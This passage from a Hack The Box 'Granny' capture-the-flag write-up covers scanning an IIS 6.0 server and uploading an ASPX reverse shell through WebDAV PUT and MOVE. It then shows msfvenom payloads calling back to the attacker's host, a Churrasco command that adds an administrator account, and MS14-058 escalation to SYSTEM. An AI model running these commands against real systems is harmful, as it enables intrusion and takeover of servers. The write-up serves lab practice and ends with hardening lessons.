+<span class="lineno" data-linenos="112 "></span>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+<span class="lineno" data-linenos="113 "></span>[+] Status codes:   200,204,301,302,307,401,403
+<span class="lineno" data-linenos="114 "></span>[+] User Agent:     gobuster/3.0.1
+<span class="lineno" data-linenos="115 "></span>[+] Show length:    true
+<span class="lineno" data-linenos="116 "></span>[+] Extensions:     html,asp,php
+<span class="lineno" data-linenos="117 "></span>[+] Expanded:       true
+<span class="lineno" data-linenos="118 "></span>[+] Timeout:        10s
+<span class="lineno" data-linenos="119 "></span>===============================================================
+<span class="lineno" data-linenos="120 "></span>2020/02/16 23:25:19 Starting gobuster
+<span class="lineno" data-linenos="121 "></span>===============================================================
+<span class="lineno" data-linenos="122 "></span>[http://10.10.10.15:80/_private](http://10.10.10.15:80/_private) (Status: 301) [Size: 156]
+<span class="lineno" data-linenos="123 "></span>[http://10.10.10.15:80/_vti_bin](http://10.10.10.15:80/_vti_bin) (Status: 301) [Size: 158]
+<span class="lineno" data-linenos="124 "></span>[http://10.10.10.15:80/_vti_bin/_vti_adm/admin.dll](http://10.10.10.15:80/_vti_bin/_vti_adm/admin.dll) (Status: 200) [Size: 195]
+<span class="lineno" data-linenos="125 "></span>[http://10.10.10.15:80/_vti_bin/shtml.dll](http://10.10.10.15:80/_vti_bin/shtml.dll) (Status: 200) [Size: 96]
+<span class="lineno" data-linenos="126 "></span>[http://10.10.10.15:80/_vti_bin/_vti_aut/author.dll](http://10.10.10.15:80/_vti_bin/_vti_aut/author.dll) (Status: 200) [Size: 195]
+<span class="lineno" data-linenos="127 "></span>[http://10.10.10.15:80/_vti_inf.html](http://10.10.10.15:80/_vti_inf.html) (Status: 200) [Size: 1754]
+<span class="lineno" data-linenos="128 "></span>[http://10.10.10.15:80/_vti_log](http://10.10.10.15:80/_vti_log) (Status: 301) [Size: 158]
+<span class="lineno" data-linenos="129 "></span>[http://10.10.10.15:80/aspnet_client](http://10.10.10.15:80/aspnet_client) (Status: 301) [Size: 161]
+<span class="lineno" data-linenos="130 "></span>[http://10.10.10.15:80/images](http://10.10.10.15:80/images) (Status: 301) [Size: 152]
+<span class="lineno" data-linenos="131 "></span>[http://10.10.10.15:80/Images](http://10.10.10.15:80/Images) (Status: 301) [Size: 152]
+<span class="lineno" data-linenos="132 "></span>[http://10.10.10.15:80/postinfo.html](http://10.10.10.15:80/postinfo.html) (Status: 200) [Size: 2440]
+<span class="lineno" data-linenos="133 "></span>===============================================================
+<span class="lineno" data-linenos="134 "></span>2020/02/16 23:26:16 Finished
+<span class="lineno" data-linenos="135 "></span>===============================================================
+<span class="lineno" data-linenos="136 "></span>
+<span class="lineno" data-linenos="137 "></span>Finished gobuster scan
+<span class="lineno" data-linenos="138 "></span>
+<span class="lineno" data-linenos="139 "></span>=========================
+<span class="lineno" data-linenos="140 "></span>
+<span class="lineno" data-linenos="141 "></span>Starting nikto scan
+<span class="lineno" data-linenos="142 "></span>
+<span class="lineno" data-linenos="143 "></span>- Nikto v2.1.6
+<span class="lineno" data-linenos="144 "></span>--------------------------------------------------------------------
+<span class="lineno" data-linenos="145 "></span>+ Target IP:          10.10.10.15
+<span class="lineno" data-linenos="146 "></span>+ Target Hostname:    10.10.10.15
+<span class="lineno" data-linenos="147 "></span>+ Target Port:        80
+<span class="lineno" data-linenos="148 "></span>+ Start Time:         2020-02-16 23:26:18 (GMT-5)
+<span class="lineno" data-linenos="149 "></span>--------------------------------------------------------------------
+<span class="lineno" data-linenos="150 "></span>+ Server: Microsoft-IIS/6.0
+<span class="lineno" data-linenos="151 "></span>+ Retrieved microsoftofficewebserver header: 5.0_Pub
+<span class="lineno" data-linenos="152 "></span>+ Retrieved x-powered-by header: ASP.NET
+<span class="lineno" data-linenos="153 "></span>+ The anti-clickjacking X-Frame-Options header is not present.
+<span class="lineno" data-linenos="154 "></span>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+<span class="lineno" data-linenos="155 "></span>+ Uncommon header &#39;microsoftofficewebserver&#39; found, with contents: 5.0_Pub
+<span class="lineno" data-linenos="156 "></span>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+<span class="lineno" data-linenos="157 "></span>+ Retrieved x-aspnet-version header: 1.1.4322
+<span class="lineno" data-linenos="158 "></span>+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)
+<span class="lineno" data-linenos="159 "></span>+ OSVDB-397: HTTP method &#39;PUT&#39; allows clients to save files on the web server.
+<span class="lineno" data-linenos="160 "></span>+ OSVDB-5646: HTTP method &#39;DELETE&#39; allows clients to delete files on the web server.
+<span class="lineno" data-linenos="161 "></span>+ Retrieved dasl header: &lt;DAV:sql&gt;
+<span class="lineno" data-linenos="162 "></span>+ Retrieved dav header: 1, 2
+<span class="lineno" data-linenos="163 "></span>+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+<span class="lineno" data-linenos="164 "></span>+ Uncommon header &#39;ms-author-via&#39; found, with contents: MS-FP/4.0,DAV
+<span class="lineno" data-linenos="165 "></span>+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+<span class="lineno" data-linenos="166 "></span>+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.
+<span class="lineno" data-linenos="167 "></span>+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.
+<span class="lineno" data-linenos="168 "></span>+ OSVDB-5647: HTTP method (&#39;Allow&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.
+<span class="lineno" data-linenos="169 "></span>+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+<span class="lineno" data-linenos="170 "></span>+ OSVDB-5646: HTTP method (&#39;Public&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.
+<span class="lineno" data-linenos="171 "></span>+ OSVDB-397: HTTP method (&#39;Public&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.
+<span class="lineno" data-linenos="172 "></span>+ OSVDB-5647: HTTP method (&#39;Public&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.
+<span class="lineno" data-linenos="173 "></span>+ WebDAV enabled (UNLOCK PROPFIND COPY MKCOL SEARCH LOCK PROPPATCH listed as allowed)
+<span class="lineno" data-linenos="174 "></span>+ OSVDB-13431: PROPFIND HTTP verb may show the server&#39;s internal IP address: [http://granny/_vti_bin/_vti_aut/author.dll](http://granny/_vti_bin/_vti_aut/author.dll)
+<span class="lineno" data-linenos="175 "></span>+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+<span class="lineno" data-linenos="176 "></span>+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+<span class="lineno" data-linenos="177 "></span>+ OSVDB-3233: /_private/: FrontPage directory found.
+<span class="lineno" data-linenos="178 "></span>+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
+<span class="lineno" data-linenos="179 "></span>+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+<span class="lineno" data-linenos="180 "></span>+ OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
+<span class="lineno" data-linenos="181 "></span>+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376). [http://www.securityfocus.com/bid/2252](http://www.securityfocus.com/bid/2252).
+<span class="lineno" data-linenos="182 "></span>+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+<span class="lineno" data-linenos="183 "></span>+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+<span class="lineno" data-linenos="184 "></span>+ 8018 requests: 0 error(s) and 32 item(s) reported on remote host
+<span class="lineno" data-linenos="185 "></span>+ End Time:           2020-02-16 23:32:39 (GMT-5) (381 seconds)
+<span class="lineno" data-linenos="186 "></span>--------------------------------------------------------------------
+<span class="lineno" data-linenos="187 "></span>+ 1 host(s) tested
+<span class="lineno" data-linenos="188 "></span>
+<span class="lineno" data-linenos="189 "></span>Finished nikto scan
+<span class="lineno" data-linenos="190 "></span>
+<span class="lineno" data-linenos="191 "></span>=========================
+</pre></div>
+
+<p>​                                                                                                                                                                          <br />
+​                                                                                                                                                                          <br />
+    ---------------------Finished all Nmap scans---------------------</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>Completed in 16 minute(s) and 19 second(s)
+</pre></div>
+
+<p>We have one port open.</p>
+<ul>
+<li><strong>Port 80: </strong>running Microsoft IIS httpd 6.0</li>
+</ul>
+<p>Before we move on to enumeration, let’s make some mental notes about the scan results.</p>
+<ul>
+<li>The only port that is open is port 80 so this will definitely be our point of entry. The port is running an outdated version of Microsoft-IIS and is using the WebDAV protocol. One thing that pops out right away is the number of allowed HTTP methods. As mentioned in the scan results, these methods could potentially allow you to add, delete and move files on the web server.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p>Visit the web application in the browser.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_Glpdq9HYu8mnOML2wcZNYA.png" /></p>
+<p>Look into the directories/files that gobuster found. We don’t find anything useful. Next, let’s test the allowed HTTP methods.</p>
+<p>The scan shows that the HTTP PUT method is allowed. This could potentially give us the ability to save files on the web server. Since this is a Microsoft IIS web server, the type of files it executes are ASP and ASPX. So let’s check if we’re allowed to upload these file extensions.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>davtest --url [http://10.10.10.15](http://10.10.10.15)
+</pre></div>
+
+<p>We get back the following result.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_JgL3sYZp_tWhx7JDIf-2xA.png" /></p>
+<p>Both ASP and ASPX are not allowed. However, TXT and HTML files are. Remember that the PUT HTTP method was not the only method that was allowed. We also can use the MOVE method. The MOVE method not only can be used to change file locations on the web server, but it can also be used to rename files. Let’s try to upload an HTML file on the web server and then rename it to change the extension to an ASPX file.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/granny# curl -X PUT [http://10.10.10.15/test.html](http://10.10.10.15/test.html) -d [@test](http://twitter.com/test).html
+</pre></div>
+
+<p>​  <br />
+    root@kali:~/Desktop/htb/granny# curl <a href="http://10.10.10.15/test.html">http://10.10.10.15/test.html</a>
+    <h1>Hello</h1></p>
+<p>We confirm that the HTML file was correctly uploaded on the web server. Next, let’s change the extension of the HTML file to ASPX.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/granny# curl -X MOVE --header &#39;Destination:[http://10.10.10.15/test.aspx&#39;](http://10.10.10.15/test.aspx&#39;) &#39;[http://10.10.10.15/test.html&#39;](http://10.10.10.15/test.html&#39;)
+<span class="lineno" data-linenos="2 "></span>
+<span class="lineno" data-linenos="3 "></span>root@kali:~/Desktop/htb/granny# curl [http://10.10.10.15/test.aspx](http://10.10.10.15/test.aspx)
+<span class="lineno" data-linenos="4 "></span>&lt;h1&gt;Hello&lt;/h1&gt;
+</pre></div>
+
+<p>Perfect! Now we have confirmed that we can successfully upload and execute ASPX code on the web server.</p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>Generate an ASPX reverse shell using msfvenom.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx
+</pre></div>
+
+<ul>
+<li>
+<p><strong>-p</strong>: payload</p>
+</li>
+<li>
+<p><strong>-f</strong>: format</p>
+</li>
+<li>
+<p><strong>LHOST</strong>: attack machine’s (kali) IP address</p>
+</li>
+<li>
+<p><strong>LPORT</strong>: the port you want to send the reverse shell to</p>
+</li>
+<li>
+<p><strong>-o</strong>: where to save the payload</p>
+</li>
+</ul>
+<p>Rename the file to <em>shell.txt </em>so that we can upload it on the server.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>mv shell.aspx shell.txt
+</pre></div>
+
+<p>Then upload the file on the web server and change the file extension to ASPX.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>curl -X PUT [http://10.10.10.15/shell.txt](http://10.10.10.15/shell.txt) --data-binary [@shell](http://twitter.com/shell).txt
+<span class="lineno" data-linenos="2 "></span>
+<span class="lineno" data-linenos="3 "></span>curl -X MOVE --header &#39;Destination:[http://10.10.10.15/shell.aspx&#39;](http://10.10.10.15.shell.aspx&#39;) &#39;[http://10.10.10.15/shell.txt&#39;](http://10.10.10.15/shell.txt&#39;)
+</pre></div>
+
+<p>Next, set up a listener on your attack machine.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 1234
+</pre></div>
+
+<p>Execute the <em>shell.aspx</em> file (either through the browser or the <em>curl</em> command) to send a shell back to our attack machine.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_yycN8mBgy0owbvD8-abFXQ.png" /></p>
+<p>We get a shell! Unfortunately, we don’t have permission to view the <em>user.txt </em>flag, so we need to escalate privileges.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_Lni1TFZq3fyeukHzXdpfVw.png" /></p>
+<p><strong>Note</strong>: This shell is unstable and seems to crash every minute or so. So the next couple of steps will have to be done in several sessions. If you don’t want to go through this torture, skip to the <strong><em>Extra Content </em></strong>section that solves the box using Metasploit.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>We’ll use <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows Exploit Suggester</a> to identify any missing patches on the Windows target machine that could potentially allow us to escalate privileges.</p>
+<p>First, download the script.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>git clone [https://github.com/GDSSecurity/Windows-Exploit-Suggester.git](https://github.com/GDSSecurity/Windows-Exploit-Suggester.git)
+</pre></div>
+
+<p>Next, install the dependencies specified in the readme document.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>pip install xlrd --upgrade
+</pre></div>
+
+<p>Update the database.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./windows-exploit-suggester.py --update
+</pre></div>
+
+<p>This creates an excel spreadsheet from the Microsoft vulnerability database in the working directory.</p>
+<p>The next step is to retrieve the system information from the target machine. This can be done using the “<em>systeminfo</em>” command.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_eSTEpJth-qCyxsxdc6HcFA.png" /></p>
+<p>Copy the output and save it in the file “<em>systeminfo.txt</em>” on the attack machine. Then run the following command.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./windows-exploit-suggester.py --database 2020-02-17-mssb.xls --systeminfo ../../htb/granny/systeminfo.txt
+</pre></div>
+
+<p>It outputs many vulnerabilities. I tried several of them, but none of them worked except for the <a href="https://www.exploit-db.com/exploits/6705">Microsoft Windows Server 2003 — Token Kidnapping Local Privilege Escalation</a> exploit. Grab the executable <a href="https://github.com/Re4son/Churrasco">from here</a> and transfer it to the attack machine in the same way we transferred the reverse shell.</p>
+<p>Whatever command we include when running the executable file, the command will get executed with escalated privileges.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_v2jCM2BLlE7v7nveldTcCA.png" /></p>
+<p>Let’s use the executable to add a user on the system that is part of the <em>Administrators</em> group.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>churrasco.exe &quot;net user test test /add &amp;&amp; net localgroup Administrators test /add&quot;
+</pre></div>
+
+<p>The command completes successfully.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_43eVshFKzUhEi68sulCpPQ.png" /></p>
+<p>However, when I try to use the “<em>runas</em>” command to switch to that user it doesn’t work. Maybe User Account Control (UAC) is enabled and the “<em>runas</em>” command does not elevate your privileges. So I figured maybe I could get it working using PowerShell as explained in <a href="https://medium.com/@asfiyashaikh10/windows-privilege-escalation-using-sudo-su-ae5573feccd9">this article</a>, but PowerShell is not installed on the machine!</p>
+<p>So all you can do is use the exploit to view the <em>user.txt</em> and <em>root.txt</em> flags. I however, like to get a privileged shell on each box I solve and so I’m going to use Metasploit to get a shell on this box.</p>
+<h2 id="extra-content-metasploit-solution">Extra Content: Metasploit Solution</h2>
+<p>I’m going to skim through this part since there are a ton of write ups out there that show how to solve this box using Metasploit.</p>
+<p>First, create an ASPX meterpreter reverse shell.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=8888 -f aspx &gt; met-shell.aspx
+</pre></div>
+
+<p>Then upload the shell payload in the same way we did before.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/granny# cp met-shell.aspx met-shell.txt
+<span class="lineno" data-linenos="2 "></span>
+<span class="lineno" data-linenos="3 "></span>root@kali:~/Desktop/htb/granny# curl -X PUT [http://10.10.10.15/met-shell.txt](http://10.10.10.15/met-shell.txt) --data-binary [@met](http://twitter.com/met)-shell.txt
+<span class="lineno" data-linenos="4 "></span>
+<span class="lineno" data-linenos="5 "></span>root@kali:~/Desktop/htb/granny# curl -X MOVE -H &#39;Destination: [http://10.10.10.15/met-shell.aspx&#39;](http://10.10.10.15/met-shell.aspx&#39;) [http://10.10.10.15/met-shell.txt](http://10.10.10.15/met-shell.txt)
+</pre></div>
+
+<p>Configure metasploit to receive the reverse shell.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>use exploit/multi/handler
+<span class="lineno" data-linenos="2 "></span>set lhost tun0
+<span class="lineno" data-linenos="3 "></span>set lport 8888
+</pre></div>
+
+<p>Confirm that the configuration was set properly using the “<em>options</em>” command.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_URuv3JpitFcQosEb7qgPUg.png" /></p>
+<p>Then use the “<em>run</em>” command to start the reverse tcp handler. In the browser, execute the <em>met-shell.aspx</em> payload and wait for a session to open up in Metasploit.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_8qr962N2EhGfjSOYVE1zSA.png" /></p>
+<p>Perfect! Next, use the local exploit suggester module to see which exploits the system is vulnerable to.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_NHjcuWBAByttFKC56LVZuQ.png" /></p>
+<p>We’ll go with the second one MS14–058.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>use exploit/windows/local/ms14_058_track_popup_menu
+<span class="lineno" data-linenos="2 "></span>set session 1
+<span class="lineno" data-linenos="3 "></span>run
+</pre></div>
+
+<p>It opens up another session.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_2gb6IknR6r5uGZ18RQnfow.png" /></p>
+<p>Let’s see what privilege we’re running with.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>meterpreter &gt; getuid
+<span class="lineno" data-linenos="2 "></span>Server username: NT AUTHORITY\SYSTEM
+</pre></div>
+
+<p>We’re system! Grab the <em>user.txt</em> flag.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_6ehYuARyQtTTL5sY_QjK9w.png" /></p>
+<p>Grab the <em>root.txt</em> flag.</p>
+<p><img alt="" src="../../img/Granny Writeup/1_w1tvAMKHwoB18O8KkeFQ7g.png" /></p>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<p>To gain an initial foothold on the box we exploited one vulnerability.</p>
+<ol>
+<li>Insecure configuration of the web server that allowed us to upload arbitrary files using the HTTP methods ‘PUT’ and ‘MOVE’. This would have been avoided if these methods were disabled.</li>
+</ol>
+<p>To escalate privileges we exploited one vulnerability.</p>
+<ol>
+<li>Kernel vulnerability in the outdated operating system that was being used. This could have been avoided if the OS was patched.</li>
+</ol>
+<h2 id="conclusion">Conclusion</h2>
+<p>34 machines down, 12 more to go!</p>
+<p><img alt="" src="../../img/Granny Writeup/1_8SA2zK6cCOAaIuI_Gwd3ZQ.png" /></p>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                23. Arctic Writeup w/o Metasploit.md
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                25. Netmon Writeup.md
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Built by <a href="http://github.com/rushic24">Rushi</a> &copy; 2020
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
+    
+      <a href="https://github.com/rushic24" class="md-footer-social__link fa fa-"></a>
+    
+      <a href="https://www.linkedin.com/in/rushichaudhari" class="md-footer-social__link fa fa-"></a>
+    
+      <a href="" class="md-footer-social__link fa fa-"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.808e90bb.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+        <script src="../../js/katex.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
